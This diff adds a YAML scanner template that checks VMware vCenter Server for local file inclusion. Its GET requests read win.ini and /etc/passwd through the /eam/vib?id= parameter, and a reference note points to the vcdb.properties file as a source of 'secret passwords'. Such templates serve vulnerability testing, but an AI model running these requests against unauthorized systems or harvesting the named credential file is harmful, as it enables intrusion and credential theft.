@@ -1,0 +1,37 @@
+id: vcenter-server-lfi
+info:
+  name: vCenter Server LFI
+  risk: Critical
+
+params:
+  - root: "{{.BaseURL}}"
+
+replicate:
+  ports: '9443'
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/eam/vib?id=C:\windows\win.ini
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("body", "driver") && StringSearch("body", "dbtype")
+
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/eam/vib?id=/etc/passwd
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("body", "bin/bash") && StringSearch("body", "root:")
+
+references:
+  - link: https://twitter.com/ptswarm/status/1316016337550938122/photo/1
+  - note: |
+      Read this file for secret passwords
+      C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
